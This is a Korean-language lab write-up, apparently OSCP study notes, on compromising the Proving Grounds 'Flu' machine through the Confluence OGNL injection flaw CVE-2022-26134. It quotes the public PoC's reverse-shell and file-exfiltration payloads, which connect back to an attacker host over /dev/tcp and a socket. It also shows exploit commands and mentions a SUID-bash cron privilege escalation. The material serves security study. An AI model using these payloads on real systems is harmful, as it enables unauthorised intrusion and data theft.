---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssti
  - tech/enum/searchsploit
  - tech/payload/revshell
  - tech/lin/cron
type: machine
platform: pg
os: linux
ip: 192.168.103.41
ports: [22, 8090, 8091]
services: [http, jamlink, ssh]
cves: [CVE-2022-26134]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---
**PG Practice — Flu · Intermediate**
타겟 192.168.248.41 · OS Ubuntu 23.04 (kernel 6.2.0-39-generic) · 난이도 Intermediate · 플래그 2/2 획득
경로 요약 8090 Atlassian Confluence **7.13.6** → **CVE-2022-26134** (URI 경로의 OGNL 주입 → Nashorn → `ProcessBuilder`) → `confluence` 사용자 리버스셸 → `/home/confluence/local.txt`
권한상승 `/opt/log-backup.sh` 가 `confluence` 소유인데 **root 개인 crontab 에서 1분마다 돌고 있었다** → 스크립트에 SUID bash 한 줄 추가 → `/root/proof.txt`

**이 노트는 두 세션이 겹쳐 있다 — 어느 쪽 실측인지 구분하라**
- 1차 세션(2026-07-14, 타겟 `192.168.103.41`) — §1~§3 foothold 까지. 이때는 권한상승을 손도 못 댔다
- 2차 세션(2026-08-20, 타겟 `192.168.248.41`) — §4 권한상승 전부. 박스를 다시 켜면서 IP 가 바뀌었다

**인용문 안의 IP 는 그 실행 시점의 실측이라 그대로 둔다.** 요약·프론트매터만 현행 IP 로 갱신했다.
8090 재스캔 결과는 1차와 동일했다(`~/PG/Flu/nmap_new.log`) — 포트 3개, 같은 버전. 그래서 §1-1 은 1차 원문을 그대로 둔다.

1차 세션이 남긴 문제는 기록 자체가 없었다는 것이다. `~/.zsh_history` 는 Kali 로컬 셸의 기록이라 `nc` 세션 안에서 친 명령을 담지 않는다.
그래서 2차 세션은 tmux 페인을 통째로 떠서 `~/PG/Flu/privesc_session.log` 로 남겼다. §4 의 모든 블록이 거기서 나왔다.

---

## 0. 이 박스에서 배우는 것

- **OGNL 주입 = 표현식 주입(SSTI)의 Java 판** — `${...}` 하나가 왜 임의 코드 실행이 되는가. Confluence·Struts2 계열의 반복 유형이다
- **URI 경로 자체가 페이로드가 될 수 있다** — 파라미터도 헤더도 아니고 경로 세그먼트에 넣는다. 그래서 WAF·로그 필터가 자주 놓친다
- **익스플로잇이 주는 권한 = 그 서비스의 실행 계정**이다. RCE를 얻었다고 root가 아니다. Confluence는 `confluence` 사용자로 돈다
- **nmap의 서비스 이름을 제품 이름으로 착각하지 않기** — `8091/tcp open jamlink?` 의 `jamlink` 는 포트 번호로 찾은 표 이름이지 지문 식별 결과가 아니다
- **searchsploit 제목의 버전 범위를 믿지 않기** — "Confluence < 8.5.3" 이라 적힌 익스플로잇이 실제로는 8.0 이상 전용이었다
- **파일 읽기 프리미티브가 조용히 실패하는 법** — 예외가 나면 아무것도 안 온다. "빈 응답 = 파일 없음"이 아니다
- **쓰기 가능한 스크립트를 root cron 이 돌린다** — 이 박스의 권한상승 전부다. `sudo -l`·SUID·capabilities 가 다 비었을 때 `find / -writable` 로 질문을 바꾸는 것
- **저권한에서 크론은 부분 관측이다** — `/etc/cron*` 이 비어도 다른 사용자의 개인 crontab 은 여전히 돌고 있고, 그건 볼 수 없다

**시험 출제 가능성**

| 요소 | 출제 가능성 | 이유 |
|---|---|---|
| `${...}` 표현식 주입 → RCE | 매우 높음 | OGNL(Confluence·Struts2)·SpEL(Spring)·Freemarker·Velocity·Jinja2 전부 같은 사고다. `${7*7}` 이 `49`로 렌더되는 순간이 시험의 전형적인 분기점이다 |
| 공개 PoC를 버전 대조 후 투입 | 매우 높음 | OSCP는 exploit-db/GitHub 익스플로잇 사용을 전제로 설계된 시험이다. 문제는 "쓰느냐"가 아니라 "맞는 걸 고르느냐" 다 |
| 서비스 계정 → root 권한상승 | 매우 높음 | 1차 세션에서 실패했던 구간이다. 답은 root cron 이 도는 쓰기 가능 스크립트 — PG·OSCP 에서 가장 흔한 리눅스 권한상승 유형 중 하나다 |
| Confluence 자체 | 낮음 | 제품은 안 나온다. 유형이 나온다 |

변형은 이런 모습이다 — Confluence 대신 Struts2(`%{...}`), Nashorn 대신 Freemarker `Execute()`, 경로 주입 대신 `Content-Type` 헤더 주입. **원리는 동일하다.**

---

## 1. 정찰

### 1-1. Nmap

`nnmap` 은 오타가 아니라 별칭이다. `~/.zshrc:247` 에 이렇게 정의돼 있다:

```
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전부 | 이 박스는 8090·8091이 둘 다 top-1000 밖이라 기본 스캔으로는 SSH만 보인다. 박스가 통째로 사라진다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Log In - Confluence` 가 안 나온다. 포트만 보고 제품을 못 맞힌다 |
| `-Pn` | 핑 스킵 | ICMP 차단 호스트를 "down"으로 버린다 |
| `--min-rate 5000` | 초당 최소 패킷 | 이 스캔이 129초에 끝난 이유. 없으면 `-p-`가 수십 분이 된다 |
| `-oN nmap.log` | 결과 파일 | 나중에 대조할 1차 사료가 사라진다 |

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ nnmap 192.168.103.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 13:51 +0900
Nmap scan report for 192.168.103.41
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:41 GMT
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:10 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:47 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.98%I=7%D=7/14%Time=6A55C079%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:09\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:5
SF:2:09\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:10\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20J
SF:ul\x202026\x2004:52:41\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:
SF:52:47\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   85.01 ms 192.168.45.1
2   84.99 ms 192.168.45.254
3   84.63 ms 192.168.251.1
4   84.67 ms 192.168.103.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.25 seconds
```

이 출력에서 읽어야 할 세 줄:

1. `http-title: Log In - Confluence` — 제품 확정. Tomcat은 껍데기이고 알맹이는 Confluence다
2. `Requested resource was /login.action?...&permissionViolation=true` — `.action` 확장자는 **WebWork/Struts2 액션 매핑**이다. 이 한 글자가 "OGNL 표현식 엔진이 안에 있다"는 신호다
3. `8091/tcp open jamlink?` — **뒤의 `?` 가 핵심이다.** §1-3 참조

### 1-2. 버전 판정 — 근거 2개 교차

8090 포트에 접속하면 로그인 페이지 하단에 버전이 박혀 있다.

![[Pasted image 20260714140908.png]]

**근거 ①과 근거 ②**
- 근거 ①(스크린샷) — 로그인 페이지 푸터: `Atlassian Confluence에 의해 제공 7.13.6`
- 근거 ②(익스플로잇 저자의 시험 환경) — 디스크의 `through_the_wire.py` 헤더가 `Version: All LTS <= 7.13.6 and all others <= 7.18.0`, `Tested on: 7.13.6 LTS / Ubuntu 20.04`

두 근거가 **출처가 다르다**(타겟 자신 / 익스플로잇 저자). 누적 교훈 2번("버전 판정은 독립 근거 2개")을 만족한다. [[Hub]]·[[Levram]] 참조.

참고로 nmap의 OS 추정(`MikroTik RouterOS 7.2 - 7.5`)은 **무시해도 된다.** SSH 배너 `OpenSSH 9.0p1 Ubuntu 1ubuntu8.5` 가 훨씬 강한 근거이고, `-p-` 스캔에서 열린 포트가 3개뿐이라 OS 지문 표본이 빈약했다.

### 1-3. `jamlink` 는 제품이 아니다 — 8091의 정체

원본 노트에는 *"다른 포트 `8090/tcp open jamlink` 검색 시 atlassian CVE 발견"* 이라고 적혀 있었다. **두 군데가 틀렸다**: `jamlink` 로 뜬 건 8090이 아니라 8091이고, `jamlink` 는 제품명이 아니다.

Kali의 `nmap-services` 표를 직접 열어 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -E "^\S+\s+809[01]/tcp" /usr/share/nmap/nmap-services
opsmessaging	8090/tcp	0.000304	# Vehicle to station messaging
jamlink	8091/tcp	0.000000	# Jam Link Framework
```

> [!danger] nmap의 SERVICE 열은 두 가지가 섞여 나온다
> - **지문 식별 성공** → 실제 제품명 (예: `ssh  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5`)
> - **지문 식별 실패** → `nmap-services` 표에서 포트 번호로 조회한 이름 + `?`
>
> `8091/tcp open jamlink?` 의 `?` 가 바로 그것이다. 게다가 빈도값이 `0.000000` 이다 — 실측 표본에서 사실상 관측된 적 없는 항목이라는 뜻이다.
> **`?` 가 붙은 SERVICE 이름으로 exploit-db를 검색하는 것은 포트 번호표를 검색하는 것과 같다.** (§6-② 참조)
>
> 진짜 단서는 그 아래 `fingerprint-strings` 에 있다 — `Server: Aleph/0.4.6`. Aleph는 Clojure의 HTTP 서버 라이브러리다. 즉 8091은 **Confluence와 무관한 별개의 Clojure 서비스**이고, 모든 GET에 `204 No Content` 만 돌려준다. 이 박스에서는 끝내 쓰이지 않았다.

---

## 2. 취약점 분석 — CVE-2022-26134

### 2-1. 배경 지식 — OGNL 이란 무엇인가

**OGNL(Object-Graph Navigation Language)** 은 Java 객체 그래프를 문자열 표현식으로 탐색·조작하는 언어다. Struts2와 Atlassian의 WebWork가 뷰 계층에서 쓴다. 템플릿에 `${user.name}` 이라 쓰면 런타임에 `getUser().getName()` 이 호출되는 식이다.

문제는 OGNL이 단순 프로퍼티 접근기가 아니라 완전한 표현식 언어라는 것이다. 메서드 호출(`.getMethod(...).invoke(...)`), 정적 클래스 참조(`Class.forName(...)`), 객체 생성이 전부 된다. 그래서 **사용자 입력이 OGNL 평가 컨텍스트에 도달하면 그 자체로 임의 코드 실행**이다.

**이것이 SSTI와 같은 계열인 이유**
Jinja2의 `{{ ''.__class__.__mro__[1].__subclasses__() }}`, Freemarker의 `<#assign x=...Execute()>`, SpEL의 `T(java.lang.Runtime).getRuntime().exec(...)` 와 **정확히 같은 사고**다.
렌더링 엔진이 "데이터"로 받아야 할 것을 "코드"로 평가한다.
**시험 반사**: 입력이 그대로 화면에 되비치는 자리를 보면 `${7*7}` · `{{7*7}}` · `%{7*7}` · `<%= 7*7 %>` 를 차례로 넣어보고 `49`가 렌더되는지 본다.

### 2-2. 왜 취약한가 — 경로 세그먼트가 OGNL로 평가된다

CVE-2022-26134는 Confluence Server/Data Center의 **URI 경로 세그먼트가 OGNL 표현식으로 평가되는** 결함이다. Confluence는 액션 네임스페이스를 URL 경로에서 해석하는데, 이 네임스페이스 문자열이 검증 없이 OGNL 평가로 흘러 들어간다.

데이터 흐름은 이렇다:

```
GET /${OGNL 표현식}/  HTTP/1.1
      └─ 경로 세그먼트
         → 액션 네임스페이스로 파싱
           → OGNL 평가 컨텍스트에 진입          ← 여기가 결함
             → Class.forName(...) 등 임의 호출 성립
```

핵심은 **인증이 필요 없다**는 것이다. 라우팅/네임스페이스 해석은 인증 필터보다 앞에서 일어나므로, 로그인 페이지밖에 못 보는 상태에서 그대로 터진다. 스캔에서 본 `permissionViolation=true` 리다이렉트는 방어가 아니라 아직 도달하지 않은 단계였을 뿐이다.

> [!warning] 익스플로잇 자신의 CVE 표기가 틀려 있다
> 디스크의 `through_the_wire.py` 헤더에는 `# CVE : CVE-2022-26123` 이라고 적혀 있는데, 같은 파일의 배너는 `CVE-2022-26134` 를 출력한다. **헤더 쪽이 오타다.**
> 누적 교훈 9번("공개 익스플로잇의 CVE 표기를 검증하라")의 실물 사례다. 저자가 붙인 참조는 벤더·NVD 판정이 아니다.

### 2-3. 왜 이 페이로드인가 — 조각내어 읽기

`through_the_wire.py` 가 만드는 리버스셸 페이로드 원문(디스크의 소스에서 그대로 옮긴 것이다):

```python
exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'
```

| 조각 | 역할 | 왜 필요한가 |
|---|---|---|
| `${ ... }` | OGNL 평가 마커 | 이게 없으면 그냥 존재하지 않는 경로 → 404 |
| `Class.forName("com.opensymphony.webwork.ServletActionContext")` | WebWork의 정적 컨텍스트 홀더 획득 | OGNL 컨텍스트에서 현재 HTTP 응답 객체에 손을 뻗는 표준 통로 |
| `.getMethod("getResponse",null).invoke(null,null)` | 리플렉션으로 `HttpServletResponse` 획득 | 직접 호출이 막혀도 리플렉션은 통과한다 |
| `.setHeader("", ...)` | 결과를 버리는 곳 | 실행이 목적이고 값은 필요 없다. 빈 헤더명에 넣어 조용히 버린다 |
| `getEngineByName("nashorn").eval(...)` | JS 엔진으로 전환 | OGNL 문법으로 프로세스를 띄우는 것보다 JS 한 줄이 훨씬 짧고 인용 충돌이 적다 |
| `new java.lang.ProcessBuilder().command('bash','-c','...')` | 실제 실행 | `Runtime.exec()` 와 달리 인자 배열을 직접 준다 — 공백·리다이렉션이 깨지지 않는다 |
| `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | 리버스셸 본체 | `bash -c` 로 감쌌기 때문에 `/dev/tcp` 가 동작한다 |

> [!danger] `bash -c` 로 감싸는 것이 선택이 아니라 필수인 이유
> `/dev/tcp/HOST/PORT` 는 **커널의 장치 파일이 아니라 bash가 내부에서 흉내 내는 가상 경로**다. bash가 아닌 셸에는 존재하지 않는다.
> `ProcessBuilder().command('bash','-i','>&','/dev/tcp/...')` 처럼 직접 넘기면 `>&` 가 **리다이렉션이 아니라 문자열 인자**가 되어 실패한다. 셸 문법을 쓰려면 반드시 셸에게 파싱을 시켜야 한다 — 그게 `bash -c` 다.
> 같은 함정의 다른 얼굴은 [[Squid]]·[[Exfiltrated]] 의 "인용이 깨지면 인코딩으로 도망간다" 항목에 있다.

마지막으로 페이로드는 URL 인코딩되어 경로에 붙는다:

```python
encoded_exploit = urllib.parse.quote(exploit)
target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/'
target_url += encoded_exploit
target_url += '/'
```

**뒤에 붙는 `/` 가 중요하다.** 이것이 없으면 Confluence의 액션 매핑이 이 문자열을 네임스페이스로 잘라내지 못한다. 공개 분석들이 이 결함을 `/${...}/` 형태로 기술하는 이유다.

> [!warning] 그런데 `quote()` 는 슬래시를 인코딩하지 않는다 — 흔한 오독을 정정한다
> 직관적으로는 *"페이로드가 완결된 하나의 경로 세그먼트로 인식된다"* 로 보이나, **틀렸다.**
> `urllib.parse.quote()` 의 `safe` 기본값은 `'/'` 다. 즉 **슬래시를 그대로 둔다.** Kali에서 확인했다:
>
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ python3 -c "import urllib.parse; p='\${...eval(\'bash -i >& /dev/tcp/10.0.0.1/1270 0>&1\')}'; print(urllib.parse.quote(p))"
> %24%7BClass.forName%28%22x%22%29.eval%28%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/1270%200%3E%261%27%29%7D
> ```
>
> `%3E%26`(`>&`)·`%20`(공백)·`%24%7B`(`${`)는 인코딩됐는데 `/dev/tcp/10.0.0.1/1270` 의 슬래시는 살아 있다.
> 따라서 실제로 나가는 요청의 경로는 여러 세그먼트로 쪼개져 있다. `--read-file /etc/passwd` 도 마찬가지다.
>
> [가정] 그럼에도 동작하는 이유는 Confluence가 이 구간을 **세그먼트 단위가 아니라 문자열 단위로** OGNL 평가에 넘기기 때문으로 보인다. 타겟이 정지돼 요청·응답을 직접 확인하지는 못했다. 관측된 사실은 "이 형태로 보냈고 실행됐다"까지다.
>
> 실전적 함의: 손으로 재현할 때 `--data-urlencode` 나 `quote(p, safe='')` 처럼 **슬래시까지 인코딩하면 오히려 실패할 수 있다.** 원본 스크립트와 같은 인코딩 수준을 유지하라. 이건 [[Squid]]·[[Hawat]] 의 "인용이 깨지면 인코딩으로 도망간다"와 반대 방향의 교훈이다 — 여기서는 과잉 인코딩이 문제다.

### 2-4. 파일 읽기 페이로드는 구조가 다르다

`--read-file` 을 주면 같은 껍데기 안의 JS만 갈아 끼운다:

```python
exploit = '${... .eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + '); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();"))}'
```

즉 **파일을 HTTP 응답으로 돌려주지 않는다.** 타겟이 Kali로 별도의 TCP 연결을 새로 열어 내용을 밀어 넣는다. 그래서 리스너가 반드시 있어야 하고, 스크립트가 알아서 `nc` 를 포크한다.

> [!danger] 실행 순서가 실패 모드를 결정한다
> JS를 순서대로 보라 — **`readAllBytes()` 가 먼저이고 `new java.net.Socket()` 이 그다음이다.**
> 따라서 **읽기 권한이 없으면 소켓이 아예 만들어지지 않는다.** 리스너는 연결조차 못 받고 조용히 앉아 있는다.
>
> "아무것도 안 왔다"가 뜻하는 것:
> - ❌ "파일이 없다" (아니다)
> - ❌ "익스플로잇이 안 통한다" (아니다)
> - ✅ **"읽으려다 예외가 났다"** — 십중팔구 권한 부족
>
> §6-③에서 내가 정확히 이 함정에 걸렸다. 누적 교훈 1번("응답이 성공을 뜻하지 않는다")의 거울상이다 — 여기서는 **무응답이 실패를 뜻하지도 않는다.** 무응답은 그저 정보가 없다는 뜻이다.

### 2-5. argparse 기본값 — 안 주면 어디로 가는가

디스크의 소스에서 그대로 읽은 정의다:

```python
parser.add_argument('--rport', ..., type=int, default="443")
parser.add_argument('--lport', ..., type=int, default="1270")
parser.add_argument('--protocol', ..., default="https://")
parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, ...)
parser.add_argument('--nc-path', ..., default="/usr/bin/nc")
```

Kali에서 같은 파서를 떼어내 직접 돌려 기본값을 확인했다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 argtest.py --rhost 1.2.3.4 --lhost 5.6.7.8 --read-file /etc/passwd
Namespace(rhost='1.2.3.4', rport=443, lhost='5.6.7.8', lport=1270, protocol='https://', reverse_shell=False, fork_nc=True, ncpath='/usr/bin/nc', read_file='/etc/passwd')
```

> [!warning] 그래서 `--rport 8090` 과 `--protocol http://` 는 둘 다 필수다
> 안 주면 `https://192.168.103.41:443/` 로 던진다. 그 포트는 **열려 있지도 않다**(`-p-` 스캔에 없다).
> 그러면 `requests.get()` 이 예외를 내고 스크립트는 `[-] The HTTP request failed` 만 찍고 끝난다 —
> **"익스플로잇이 안 통하는 박스"로 오판하기 딱 좋은 실패 모드다.**

> [!note] `--fork-nc` 는 끌 수 없다 (소스상의 버그)
> `action="store_true"` 인데 `default=True` 다. 즉 **플래그를 줘도 True, 안 줘도 True** — 아무리 해도 `False` 가 되지 않는다.
> 결과적으로 **스크립트가 항상 `nc -lvnp 1270` 을 포크한다.** 그래서 별도 리스너를 미리 띄워 두면 포트 충돌이 난다.
> 이 박스에서는 그냥 맡겨 뒀고, 실행 출력의 `listening on [any] 1270 ...` 이 포크가 실제로 동작했음을 보여준다.

### 2-6. 왜 하필 `nashorn` 인가 — 이 익스플로잇의 숨은 전제

페이로드는 OGNL 안에서 곧바로 프로세스를 띄우지 않고 JS 엔진을 한 번 경유한다:

```
getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()...")
```

**Nashorn** 은 JDK 8에 들어온 자바스크립트 엔진이다. `javax.script.ScriptEngineManager` 로 이름만 대면 꺼내 쓸 수 있고, JS 코드에서 `java.*` 클래스를 그대로 부를 수 있다. 그래서 "OGNL로 표현하기 번거로운 것을 JS로 짧게 쓰는 우회로" 가 된다.

이 우회로를 쓰는 이유는 두 가지다:

1. **인용 계층이 줄어든다.** OGNL만으로 `ProcessBuilder` 에 문자열 배열을 넘기려면 OGNL 배열 문법과 이스케이프가 겹겹이 쌓인다. JS 한 줄이 훨씬 짧다
2. **OGNL 샌드박스 우회의 고전 패턴이다.** Confluence·Struts2는 OGNL 컨텍스트에 블랙리스트를 걸어 왔는데, `ScriptEngineManager` 를 거치면 평가 주체가 바뀌어 그 목록을 비껴간다

> [!warning] 그래서 이 익스플로잇에는 Java 버전 전제가 붙어 있다
> Nashorn은 JDK 11에서 deprecated(JEP 335), JDK 15에서 제거됐다(JEP 372). 제거된 런타임에서는 `getEngineByName("nashorn")` 이 `null` 을 반환하고, 그 뒤의 `.eval(...)` 이 NPE로 죽는다 — **결함은 그대로인데 페이로드만 불발한다.**
>
> 2차 세션에서 셸을 잡고 확인했다 — **JDK 11.0.14.1 이다.** 처음엔 [가정](JDK 8 또는 11)으로만 남겨 뒀던 것이 실측으로 확정됐다:
>
> ```bash
> confluence@flu:/opt/atlassian/confluence/bin$ /opt/atlassian/confluence/jre/bin/java -version
> openjdk version "11.0.14.1" 2022-02-08
> OpenJDK Runtime Environment Temurin-11.0.14.1+1 (build 11.0.14.1+1)
> OpenJDK 64-Bit Server VM Temurin-11.0.14.1+1 (build 11.0.14.1+1, mixed mode)
> ```
>
> Nashorn 은 11 에서 **deprecated 이지만 아직 존재한다.** 15 에서 제거됐으니 이 페이로드가 통한 것이다.
> 그리고 이 JRE 는 **Confluence 가 번들로 들고 온 것**이다(`/opt/atlassian/confluence/jre/`) — OS 의 `java` 와 무관하다. `java -version` 을 `PATH` 로 치면 다른 답이 나올 수 있으니 프로세스가 실제로 쓰는 경로(`ps` 의 첫 인자)로 확인해야 한다.
>
> 일반화 — 이게 시험에서 중요한 이유: 같은 CVE에 PoC가 여러 개 있으면 **페이로드가 무엇에 의존하는지**가 선택 기준이 된다. Nashorn 판이 불발하면 같은 OGNL 진입점에 다른 실행 수단을 얹으면 된다:
>
> | 실행 수단 | 전제 | 비고 |
> |---|---|---|
> | `nashorn` + `ProcessBuilder` | JDK ≤ 14 | 이 PoC |
> | OGNL 직접 `ProcessBuilder` | 없음 | 인용이 지저분해진다 |
> | `Runtime.getRuntime().exec()` | 없음 | 셸 문법을 못 쓴다. `bash -c` 배열로 감싸야 한다 |
> | `javax.script` + `JavaScript`/`js` 이름 | GraalJS 탑재 시 | 최신 JDK의 대체 엔진 |
>
> **"익스플로잇이 안 통한다"의 원인이 결함 부재가 아니라 페이로드 부적합일 수 있다.** §6-③·§6-⑤와 같은 계열의 오판이다.

---

## 3. Foothold

### 3-1. 익스플로잇 확보

`searchsploit` 에는 7.13.6에 맞는 것이 없었다(§6-① 참조). GitHub의 Rapid7 PoC를 직접 클론했다.

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ git clone https://github.com/jbaines-r7/through_the_wire.git
Cloning into 'through_the_wire'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (22/22), done.
Receiving objects: 100% (25/25), 11.17 KiB | 11.17 MiB/s, done.
Resolving deltas: 100% (12/12), done.
remote: Total 25 (delta 12), reused 8 (delta 3), pack-reused 0 (from 0)
```

![[Pasted image 20260714141236.png]]

> [!tip] OSCP 시험 규정 — 이건 허용이다
> 공개 PoC 스크립트는 **금지 대상이 아니다.** 금지 정의는 *"스스로 취약점을 발견해 자동으로 익스플로잇하는"* 도구다(`sqlmap`·`db_autopwn`·Nessus 계열).
> 특정 CVE 하나를 겨냥한 PoC는 스스로 아무것도 발견하지 않는다 — 내가 버전을 판정하고 내가 고른 것이다.
> Metasploit은 **금지가 아니라 1대 한정**이고, 이 박스는 msf를 쓰지 않았으므로 그 한 장을 아꼈다.

### 3-2. 파일 읽기로 실행 확인 — 먼저 `/etc/passwd`

리버스셸을 던지기 전에 **덜 시끄러운 프리미티브로 먼저 실행을 증명한다.** 셸이 안 붙으면 원인이 "익스플로잇 실패"인지 "아웃바운드 차단"인지 구분이 안 되기 때문이다. 파일 읽기가 되면 RCE는 확정이고 남은 변수는 네트워크뿐이다.

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd
